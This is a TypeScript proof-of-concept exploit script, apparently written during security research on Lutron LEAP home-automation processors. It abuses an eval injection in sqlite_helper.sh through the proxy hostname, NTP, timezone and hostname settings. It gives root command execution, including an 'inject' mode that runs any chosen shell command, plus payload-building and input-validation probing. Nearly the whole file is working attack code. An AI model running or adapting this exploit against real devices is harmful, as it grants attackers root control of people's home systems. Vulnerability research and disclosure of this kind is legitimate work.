#!/usr/bin/env npx tsx

/**
 * LEAP sqlite_helper.sh eval injection POC — proxy hostname vector
 *
 * Proves the eval vulnerability is systemic (not NTP-specific) by exploiting
 * ProxyProperties.Hostname, which monit auto-triggers every ~30s via
 * check_socks_proxy_daemon.sh → getProxyClientSettings.sh → sqlite_helper.sh.
 *
 * INDEPENDENCE FROM PRIOR ROOT:
 *   Our previous root was obtained via the NTP vector. To prove this is a
 *   distinct, independent exploit path:
 *   1. The payload writes a unique marker file with call-stack forensics
 *      (PPID, /proc/self/cmdline, date) proving it ran inside monit's
 *      check_socks_proxy_daemon.sh, NOT from an SSH session
 *   2. The marker filename includes a nonce generated at injection time,
 *      so it couldn't have been pre-planted
 *   3. We record timestamps: LEAP write time vs file creation time, proving
 *      the ~30s monit cycle latency
 *   4. After injection, we restore the original value before verifying —
 *      the marker file is the only artifact
 *
 * Usage:
 *   npx tsx tools/leap-eval-poc.ts probe                         # read current proxy config
 *   npx tsx tools/leap-eval-poc.ts exploit                       # full exploit + verify cycle
 *   npx tsx tools/leap-eval-poc.ts inject <shell-command>        # custom command injection
 *   npx tsx tools/leap-eval-poc.ts restore                       # restore proxy hostname
 *   npx tsx tools/leap-eval-poc.ts --vector ntp|proxy|tz|hostname
 */

import * as crypto from "crypto";
import { defaultHost } from "../lib/config";
import { LeapConnection } from "../lib/leap-client";

const args = process.argv.slice(2);
const getArg = (name: string) => {
  const i = args.indexOf(name);
  return i !== -1 ? args[i + 1] : undefined;
};

const host = getArg("--host") ?? getArg("-h") ?? defaultHost;
const vector = getArg("--vector") ?? getArg("-v") ?? "proxy";
const command =
  args.find(
    (a) =>
      !a.startsWith("-") &&
      a !== host &&
      a !== vector &&
      a !== "--host" &&
      a !== "-h" &&
      a !== "--vector" &&
      a !== "-v",
  ) ?? "probe";
const shellCmd = (() => {
  const ci = args.indexOf(command);
  return ci !== -1 ? args[ci + 1] : undefined;
})();

function makePayload(cmd: string): string {
  return `'; ${cmd}; echo '`;
}

interface VectorConfig {
  name: string;
  dbField: string;
  readUrl: string;
  writeUrl: string;
  readPath: string[];
  buildUpdateBody: (value: string) => any;
  triggerDesc: string;
  callerScript: string;
  restoreValue: string;
}

const VECTORS: Record<string, VectorConfig> = {
  proxy: {
    name: "ProxyProperties.Hostname",
    dbField: "Hostname FROM ProxyProperties",
    readUrl: "/networkinterface/1",
    writeUrl: "/networkinterface/1",
    readPath: ["NetworkInterface", "SOCKS5ProxyProperties"],
    buildUpdateBody: (value: string) => ({
      NetworkInterface: {
        SOCKS5ProxyProperties: {
          Hostname: value,
          Port: 1080,
        },
      },
    }),
    triggerDesc:
      "monit → check_socks_proxy_daemon.sh every ~30s (automatic, no interaction)",
    callerScript: "check_socks_proxy_daemon.sh",
    restoreValue: "",
  },
  ntp: {
    name: "NTPServerEndpoint.Endpoint",
    dbField: "NtpPreferredUrl FROM NTPSettings",
    readUrl: "/service/ntpserver",
    writeUrl: "/service/ntpserver/1",
    readPath: ["NTPServerProperties", "Endpoints"],
    buildUpdateBody: (value: string) => ({
      NTPServerEndpoint: {
        Endpoint: value,
      },
    }),
    triggerDesc: "chrony config reload (NTP config change)",
    callerScript: "updateChronyConfHelperScript.sh",
    restoreValue: "time.iot.lutron.io",
  },
  tz: {
    name: "System.TimeZone",
    dbField: "TimeZoneString FROM Domain",
    readUrl: "/system",
    writeUrl: "/system",
    readPath: ["System"],
    buildUpdateBody: (value: string) => ({
      System: {
        TimeZone: value,
      },
    }),
    triggerDesc: "timezone config change → loadTimezone.sh",
    callerScript: "getTimeZoneSetting.sh",
    restoreValue: "US/Eastern",
  },
  hostname: {
    name: "NetworkInterface.CustomHostname",
    dbField: "CustomHostname FROM NetworkSettings",
    readUrl: "/networkinterface/1",
    writeUrl: "/networkinterface/1",
    readPath: ["NetworkInterface"],
    buildUpdateBody: (value: string) => ({
      NetworkInterface: {
        IPv4Properties: {
          CustomHostname: value,
        },
      },
    }),
    triggerDesc: "boot or network reconfigure → applyHostname.sh",
    callerScript: "getHostname.sh",
    restoreValue: "",
  },
};

function resolve(obj: any, path: string[]): any {
  let cur = obj;
  for (const key of path) {
    if (cur == null) return undefined;
    cur = cur[key];
  }
  return cur;
}

function nonce(): string {
  return crypto.randomBytes(4).toString("hex");
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

function ts(): string {
  return new Date().toISOString();
}

async function main() {
  const vec = VECTORS[vector];
  if (!vec) {
    console.error(`Unknown vector: ${vector}`);
    console.error(`Available: ${Object.keys(VECTORS).join(", ")}`);
    process.exit(1);
  }

  console.log(`Vector:  ${vec.name}`);
  console.log(`DB row:  ${vec.dbField}`);
  console.log(`Trigger: ${vec.triggerDesc}`);
  console.log(`Host:    ${host}`);
  console.log();

  const conn = new LeapConnection({ host });
  await conn.connect();
  console.log("Connected to LEAP\n");

  try {
    switch (command) {
      case "probe": {
        console.log(`--- Reading ${vec.readUrl} ---`);
        const body = await conn.readBody(vec.readUrl);
        const target = resolve(body, vec.readPath);
        console.log(JSON.stringify(target, null, 2));

        if (vector === "proxy") {
          console.log("\n--- Full /networkinterface/1 body ---");
          console.log(JSON.stringify(body, null, 2));
        }
        break;
      }

      case "exploit": {
        const tag = nonce();
        const f = `/tmp/e-${tag}`;
        const markerPath = f;

        // Forensic payload captures: nonce, uid, date, $0 (calling script), parent cmdline
        // For NTP: $0 = getNtpUrl.sh, parent = updateChronyConfHelperScript.sh
        // For proxy: $0 = getProxyClientSettings.sh, parent = check_socks_proxy_daemon.sh
        const forensicCmd = `F=${f};echo ${tag}>$F;id>>$F;date -u>>$F;echo $0>>$F;tr '\\0' ' '</proc/$PPID/cmdline>>$F`;

        const payload = makePayload(forensicCmd);
        const payloadLen = payload.length;
        console.log(`Payload length: ${payloadLen}/255 chars`);
        if (payloadLen > 255) {
          console.error(`Payload too long!`);
          process.exit(1);
        }

        console.log("=== PROXY HOSTNAME eval INJECTION POC ===");
        console.log();
        console.log("Proving this is independent of prior NTP root exploit:");
        console.log(`  - Unique nonce: ${tag}`);
        console.log(`  - Marker file:  ${markerPath}`);
        console.log(`  - Forensics:    uid, date, $0, $PPID cmdline`);
        console.log(`  - Expected caller: ${vec.callerScript} (via monit)`);
        console.log();

        // Step 1: Read original value
        console.log("Step 1: Reading original value...");
        const origBody = await conn.readBody(vec.readUrl);
        const origValue = resolve(origBody, vec.readPath);
        console.log(`  Current: ${JSON.stringify(origValue)}`);
        console.log();

        // Step 2: Write payload
        console.log("Step 2: Writing payload via LEAP UpdateRequest...");
        console.log(`  [${ts()}] Sending to ${vec.writeUrl}`);
        const updateBody = vec.buildUpdateBody(payload);
        const resp = await conn.update(vec.writeUrl, updateBody);
        const status = resp.Header?.StatusCode ?? "?";
        console.log(`  Response: ${status}`);

        if (!status.startsWith("2")) {
          console.log();
          console.log("WRITE REJECTED. Response body:");
          console.log(JSON.stringify(resp.Body, null, 2));
          console.log();
          console.log("The LEAP handler rejected this field. Possible issues:");
          console.log(
            "  - Wrong body shape (try `probe` to inspect structure)",
          );
          console.log("  - Field-level validation on Hostname");
          console.log(
            "  - SOCKS5ProxyProperties may need EnabledState set first",
          );
          console.log();
          console.log("Try enabling the proxy first:");
          console.log(
            '  npx tsx tools/leap-eval-poc.ts inject-raw \'{"NetworkInterface":{"SOCKS5ProxyProperties":{"EnabledState":"Enabled","Hostname":"PAYLOAD"}}}\'',
          );
          break;
        }

        const writeTime = new Date();
        console.log(`  [${writeTime.toISOString()}] Payload accepted`);
        console.log();

        // Step 3: Wait for monit
        console.log("Step 3: Waiting for monit cycle (~30-60s)...");
        console.log("  monit runs check_socks_proxy_daemon.sh periodically.");
        console.log(
          "  That script calls getProxyClientSettings.sh which reads",
        );
        console.log("  ProxyProperties.Hostname via sqlite_helper.sh → eval.");
        console.log();
        console.log(`  Marker will appear at: ${markerPath}`);
        console.log("  Verify from your existing SSH session:");
        console.log(`    watch -n5 ls -la ${markerPath}`);
        console.log();
        console.log("  Or wait here and I'll tell you when to check.");
        console.log(
          "  Press Ctrl+C to skip waiting (if you'll check manually).",
        );
        console.log();

        // Wait 45s for monit cycle
        for (let i = 45; i > 0; i -= 5) {
          process.stdout.write(`  Waiting ${i}s...\r`);
          await sleep(5000);
        }
        console.log("  Wait complete.                     ");
        console.log();

        // Step 4: Restore
        console.log("Step 4: Restoring proxy hostname to empty...");
        const restoreBody = {
          NetworkInterface: {
            SOCKS5ProxyProperties: {
              EnabledState: "Disabled",
              Hostname: "",
            },
          },
        };
        const restoreResp = await conn.update(vec.writeUrl, restoreBody);
        const restoreStatus = restoreResp.Header?.StatusCode ?? "?";
        console.log(`  Restore response: ${restoreStatus}`);
        console.log();

        // Step 5: Verification instructions
        console.log("=== VERIFICATION ===");
        console.log();
        console.log("SSH into the processor and check the marker file:");
        console.log(`  ssh root@${host} cat ${markerPath}`);
        console.log();
        console.log("Expected contents (5 lines):");
        console.log(
          `  ${tag}                                  ← nonce (proves not pre-planted)`,
        );
        console.log(
          "  uid=0(root) gid=0(root) groups=0(root) ← root execution",
        );
        console.log(
          "  <UTC date ~30-60s after LEAP write>     ← timing matches monit cycle",
        );
        console.log(
          "  /usr/sbin/getProxyClientSettings.sh     ← caller (NOT getNtpUrl.sh)",
        );
        console.log(
          "  /bin/sh ... check_socks_proxy_daemon.sh ← parent is monit chain (NOT sshd)",
        );
        console.log();
        console.log("Independence proof:");
        console.log(
          "  1. Nonce is random — file couldn't have been pre-planted via SSH",
        );
        console.log(
          "  2. $0 = getProxyClientSettings.sh — different script than NTP vector",
        );
        console.log(
          "  3. Parent cmdline = monit/check_socks_proxy — not an SSH session",
        );
        console.log(
          `  4. Timestamp ~30-60s after LEAP write at ${writeTime.toISOString()}`,
        );
        console.log();
        console.log(`Cleanup: ssh root@${host} rm ${markerPath}`);
        break;
      }

      case "test-write": {
        // Probe which individual characters the proxy hostname validation rejects
        const testChars =
          "' \" ; | & ` $ ( ) { } < > \\ / ! # ~ * ? [ ] \n \t".split(" ");
        console.log("=== PROXY HOSTNAME CHARACTER VALIDATION ===\n");

        for (const ch of testChars) {
          const testVal = `test${ch}host.com`;
          const body = {
            NetworkInterface: {
              SOCKS5ProxyProperties: { Hostname: testVal },
            },
          };
          try {
            const resp = await conn.update("/networkinterface/1", body);
            const st = resp.Header?.StatusCode ?? "?";
            if (st.startsWith("2")) {
              const label =
                ch === " "
                  ? "SPACE"
                  : ch === "\n"
                    ? "\\n"
                    : ch === "\t"
                      ? "\\t"
                      : ch;
              console.log(`  ✓ '${label}' ACCEPTED`);
              // Restore
              await conn.update("/networkinterface/1", {
                NetworkInterface: {
                  SOCKS5ProxyProperties: { Hostname: "test.example.com" },
                },
              });
            } else {
              const msg = resp.Body?.Message ?? "";
              const label =
                ch === " "
                  ? "SPACE"
                  : ch === "\n"
                    ? "\\n"
                    : ch === "\t"
                      ? "\\t"
                      : ch;
              console.log(`  ✗ '${label}' REJECTED: ${msg}`);
            }
          } catch (e: any) {
            console.log(`  ✗ '${ch}' Error: ${e.message}`);
          }
        }
        break;
      }

      case "inject": {
        if (!shellCmd) {
          console.error("Usage: inject <shell-command>");
          console.error('Example: inject "id > /tmp/pwned"');
          process.exit(1);
        }

        const payload = makePayload(shellCmd);
        console.log(`Command: ${shellCmd}`);
        console.log(`Payload: ${payload}`);
        console.log();

        const updateBody = vec.buildUpdateBody(payload);
        console.log(`Writing to ${vec.writeUrl}...`);
        const resp = await conn.update(vec.writeUrl, updateBody);
        const status = resp.Header?.StatusCode ?? "?";
        console.log(`Response: ${status}`);
        if (resp.Body) console.log(JSON.stringify(resp.Body, null, 2));

        if (status.startsWith("2")) {
          console.log();
          console.log(`Payload written. ${vec.triggerDesc}`);
          console.log();
          console.log("IMPORTANT: Restore when done:");
          console.log(
            `  npx tsx tools/leap-eval-poc.ts restore --vector ${vector}`,
          );
        }
        break;
      }

      case "restore": {
        console.log(`Restoring ${vec.name} to: "${vec.restoreValue}"`);
        const updateBody = vec.buildUpdateBody(vec.restoreValue);
        const resp = await conn.update(vec.writeUrl, updateBody);
        const status = resp.Header?.StatusCode ?? "?";
        console.log(`Response: ${status}`);
        if (resp.Body) console.log(JSON.stringify(resp.Body, null, 2));

        // Verify
        console.log("\nVerifying...");
        const check = await conn.readBody(vec.readUrl);
        const val = resolve(check, vec.readPath);
        console.log(JSON.stringify(val, null, 2));
        break;
      }

      default:
        console.error(`Unknown command: ${command}`);
        console.error("Commands: probe, exploit, inject, restore");
        process.exit(1);
    }
  } finally {
    conn.close();
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
